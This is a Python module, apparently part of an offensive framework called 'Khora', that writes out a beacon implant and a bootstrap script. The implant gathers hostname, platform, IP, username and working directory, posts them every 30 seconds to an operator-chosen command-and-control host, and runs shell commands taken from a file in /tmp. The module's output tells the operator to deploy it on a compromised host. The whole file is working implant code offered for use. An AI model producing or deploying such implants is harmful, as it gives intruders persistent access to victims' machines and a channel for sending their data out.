"""
Agent Module - Implant/Beacon Payload Generation
Generates lightweight Python beacon agents and bootstrap scripts.
"""

import os
import logging
from pathlib import Path

logger = logging.getLogger("Khora.Agent")

PYTHON_AGENT_TEMPLATE = r'''#!/usr/bin/env python3
import http.client
import json
import os
import platform
import socket
import subprocess
import time

TARGET = "{lhost}"
PORT = 8080
INTERVAL = 30


def gather_system_info():
    return {{
        'hostname': socket.gethostname(),
        'platform': platform.platform(),
        'ip': socket.gethostbyname(socket.gethostname()),
        'user': os.getlogin(),
        'cwd': os.getcwd(),
    }}


def send_beacon(payload):
    try:
        conn = http.client.HTTPConnection(TARGET, PORT, timeout=10)
        body = json.dumps(payload)
        conn.request('POST', '/agent', body, {{'Content-Type': 'application/json'}})
        response = conn.getresponse()
        conn.close()
        return response.status == 200
    except Exception:
        return False


def run_command(cmd):
    try:
        completed = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=20)
        return completed.stdout + completed.stderr
    except Exception as e:
        return str(e)


def main():
    while True:
        info = gather_system_info()
        info['type'] = 'beacon'
        info['timestamp'] = time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())

        if send_beacon(info):
            pass

        # Example local command execution trigger.
        if os.path.exists('/tmp/khora_agent_cmd.txt'):
            with open('/tmp/khora_agent_cmd.txt') as f:
                command = f.read().strip()
            if command:
                output = run_command(command)
                print(output)
                os.remove('/tmp/khora_agent_cmd.txt')

        time.sleep(INTERVAL)


if __name__ == '__main__':
    main()
'''

BOOTSTRAP_SCRIPT = r'''#!/bin/bash
# Khora Agent bootstrap
python3 payloads/python_agent.py &
'''


def generate_agent_payload(lhost):
    Path('payloads').mkdir(exist_ok=True)
    agent_file = Path('payloads') / 'python_agent.py'
    with open(agent_file, 'w') as f:
        f.write(PYTHON_AGENT_TEMPLATE.format(lhost=lhost))
    os.chmod(agent_file, 0o755)
    logger.info(f"Generated Python agent: {agent_file}")
    return agent_file


def generate_bootstrap_script(lhost):
    Path('payloads').mkdir(exist_ok=True)
    bootstrap_file = Path('payloads') / 'agent_bootstrap.sh'
    with open(bootstrap_file, 'w') as f:
        f.write(BOOTSTRAP_SCRIPT)
    os.chmod(bootstrap_file, 0o755)
    logger.info(f"Generated agent bootstrap: {bootstrap_file}")
    return bootstrap_file


def run(target, lhost, lport=4444):
    print(f"\n{'='*70}")
    print("AGENT MODULE - Implant / Beacon Payloads".center(70))
    print('='*70)
    print(f"Target: {target}")
    print(f"Beacon server: {lhost}:8080\n")

    agent_file = generate_agent_payload(lhost)
    bootstrap_file = generate_bootstrap_script(lhost)

    print(f"[✓] Agent payload created: {agent_file}")
    print(f"[✓] Bootstrap script created: {bootstrap_file}")
    print("\n[!] Deploy the agent to a compromised host and execute the bootstrap script.")
    print("[!] The agent will send periodic beacons to the Khora C2 HTTP server.")
    print('='*70 + "\n")
    logger.info("Agent module completed")
